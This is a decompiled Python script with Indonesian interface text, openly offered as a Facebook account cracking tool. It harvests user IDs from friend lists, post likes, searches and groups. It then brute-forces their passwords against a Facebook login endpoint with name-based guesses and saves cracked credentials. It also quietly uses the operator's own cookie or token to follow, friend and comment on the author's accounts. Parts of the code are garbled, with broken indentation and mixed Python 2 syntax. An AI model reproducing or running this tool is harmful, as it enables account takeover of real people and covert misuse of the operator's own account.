# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#Kalo mau recode ngaca dulu kontol
#My facebook (https://www.facebook.com/KM39453)
import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor

def clear():
    os.system("clear")
def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def baner():
    time.sleep(0.1)
    kata("""\n\t\033[90m    ~  ~\033[92m┌∩┐\033[94m(\033[91m◣_◢\033[94m)\033[92m┌∩┐\033[90m~  ~ 
\t\033[00m  ❤CRACK AKUN FACEBOOK💙
\t\033[90m -------------------------\033[94m\n
 \033[1;91m██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
\033[1;91m██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
\033[1;96m██║     ██████╔╝███████║██║     █████╔╝ 
\033[1;96m██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
\033[1;93m╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
\033[1;93m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝
\033[94m────────────────────────────────────────────────\033[00m
\033[1;93m{\033[1;96m×\033[1;93m} \033[1;92mAuthor    \033[1;91m: \033[1;96mRizky Ferdiansyah\033[00m
\033[1;93m{\033[1;96m×\033[1;93m} \033[1;92mGithub    \033[1;91m: \033[1;96mgithub.com/RizkyFerdiansyah\033[00m
\033[1;93m{\033[1;96m×\033[1;93m} \033[1;92mFacebook  \033[1;91m: \033[1;96mRizky Ferdiansyah XD.\033[00m
\033[94m────────────────────────────────────────────────\033[00m""")
def balik():
    f=input("\033[00m\t[\033[96m Tekan Enter Untuk Kembali\033[00m]")
    if f == "":
       os.system("python B0k3p.py")
    else:
       sys.exit("\033[1;91mKeluar\033[00m")
def mbf():
    time.sleep(0.1)
    print("\033[00m{\033[96m1\033[00m} Mulai Crack ID")
    print("\033[00m{\033[96m2\033[00m} Turtor cara dapatkan cokies fb")
    print("\033[00m{\033[96m3\033[00m} Update Tools")
    print("\033[00m{\033[96m4\033[00m} Follow Facebook")
    print("\033[00m{\033[96m0\033[00m} Keluar")
    time.sleep(0.1)
    f=input("\n\033[90m└──►\033[1;93m")
    if f == "1":
         print("\033[1;94m────────────────────────────────────────────────\033[00m")
         kata("""\033[1;91mPeringatan!! \033[1;94mTools Ini Menggunakan Login Cookies Facebook Untuk Memulai Crack\033[00m""")
         os.system("xdg-open https://github.com/RizkyFerdiansyah/SMBF") 
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         hack = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                    cek = input("\033[90m> \033[00mCookies fb anda? \033[1;91m: \033[1;92m")
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[90m> \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
             else:
                  exit("\033[00m[\033[91m!\033[00m]\033[00mCookies \033[1;91mSalah!!\033[00m")
                  
                  
                  def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;39m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100009762935968')
	kom = ('BANG RIZKY GANTENG BANGET')
	reac = ('ANGRY')
	post = ('1404788426523242')
	post2 = ('1404788426523242')
	kom2 = ('Izin Pakai sc lu bang')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	
	
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m─> \033[1;32m{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('results-life.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m─> \033[1;33m{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('results-check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] hacked : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[90m> \033[1;96m' + str(len(id)) + " \033[00msedang mengambil ID...",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit("\033[90m> \033[1;91mcant dump id\033[00m ")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[90m \033[1;96m{str(len(id))} \033[00msedang mengambil ID...',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00msedang mengambil ID...",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00msedang mengambil ID...",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   clear()
                   baner()
                   kata('\033[1;97m{\033[1;93m1\033[1;97m} \033[00mCrack Dari Teman')
                   kata('\033[1;97m{\033[1;93m2\033[1;97m} \033[00mCrack Dari Link Post\033[1;97m ')
                   kata('\033[1;97m{\033[1;93m3\033[1;97m} \033[00mCrack Dari Pencarian Nama')
                   kata('\033[1;97m{\033[1;93m4\033[1;97m} \033[00mCrack Dari Grup ')
                   kata('\033[1;97m{\033[1;93m5\033[1;97m} \033[00mCrack Dari Teman Publik')
                   kata('\033[1;97m{\033[1;93m6\033[1;97m} \033[00mLihat Hasil Crack')
                   kata('\033[94m────────────────────────────────────────────────\033[0m\n')
                   print()
                   tanya = input('\033[90m└──►\033[1;93m ')
                   if tanya =="":
                         exit("\033[00m[\033[91m!\033[00m] Tidak boleh kosong")
                   elif tanya == '1':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif tanya == '2':
                         username = input("\033[90m> \033[00mLink Post? : \033[1;92m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] Tidak boleh kosong")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'm.facebook.com' in username:
                                 username = username.replace('m.facebook.com','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif tanya == '3':
                         knf = input("\033[90m> \033[00mpertanyaan \033[1;91m: \033[1;92m")
                         username = bysearch(mbasic.format('/search/people/?q='+knf))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[00m] tidak ada")
                   elif tanya == '4':
                         print("\033[90m> \033[00mhanya bisa mengambil \033[91m100 \033[00mID ")
                         grab = input("\033[90m> \033[00mID group \033[1;91m: \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[00m]ID Tidak ada")
                   elif tanya == '5':
                         knf = input("\033[90m> \033[00mUsername/Id \033[1;91m: \033[1;92m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("\033[00m[\033[91m!\033[00m] User Tidak ada ")
                   elif tanya == '6':
                         try:
                                 file1 = open("results-check.txt").read()
                                 file2 = open("results-hack.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[00m [\033[1;93m{str(len(final))}\033[00m] akun untuk diperiksa ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 os.remove("results-check.txt")
                                 os.remove("results-life.txt")
                                 for x in life:
                                         with open('results-hack.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('results-check.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\033[00m[\033[92m✓\033[00m] Selesai")
                                 print("\033[90m> \033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-hack.txt")
                         except FileNotFoundError:
                                 exit("\033[00m[\033[91m!\033[00m] kamu tidak mendapatkan hasil")
                   else:
                         exit("\033[00m[\033[91m!\033[00m] nomor salah")
                   print()
                   expass = input("\033[90m> \033[00mPassword Tambahan \033[1;91m: \033[1;92m")
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '123',
                                                  str(x) + '1234',
                                                  str(x) + '12345',
                                                  str(x) + 'freefire',
                                                  str(x) + 'sayang',
                                                  str(x) + 'bangsat',
                                                  str(x) + 'cantik',
                                                  str(x) + 'ngentot'
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\033[1;94m────────────────────────────────────────────────\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] Selesai")
                           print("\033[00m[\033[92m✓\033[00m]hacked : \033[92mresults-hack.txt\033[00m")
                           print("\033[00m[\033[91m!\033[00m]checkpoint : \033[93mresults-check.txt\033[00m")
                           print("\n\n")
                   
                   else:
                           time.sleep(0.1)
                           print("\033[94m────────────────────────────────────────────────\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] Selesai")
                           print("\033[00m[\033[91m!\033[00m] Tidak ada hasil")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\033[00m[\033[91m!\033[00m] Tidak ada koneksi")

    elif f == "2":
         os.system("xdg-open https://githun.com/RizkyFerdiansyah/SMBF") 
         balik()

    elif f == "3":
         os.system("git pull")
         balik()

    elif f == "4":
         os.system("xdg-open https://www.facebook.com/100009762935968") 
         balik()

    elif f == "0":
         sys.exit("\033[00m[\033[91m!\033[00m]\033[91mSelamat Tinggal\033[00m")
         exit()


if __name__=="__main__":
     clear()
     baner()
     mbf()
     balik()

